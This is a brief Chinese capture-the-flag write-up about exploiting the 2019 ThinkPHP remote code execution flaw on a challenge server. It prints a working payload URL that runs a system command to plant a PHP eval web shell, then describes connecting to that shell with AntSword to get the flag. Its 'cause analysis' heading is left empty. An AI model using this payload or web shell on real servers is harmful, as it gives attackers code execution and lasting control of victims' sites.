19年爆的thinkphp rce现在竟然被用了（感觉学到了前线的感觉）

先写payload（网上直接搜索到了现成的payload）

http://61.147.171.105:60269/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo '<?php @eval($_POST["code"]);?>' > 1.php   

然后用蚁剑链接http://61.147.171.105:60269/1.php

找到flag即可

漏洞成因分析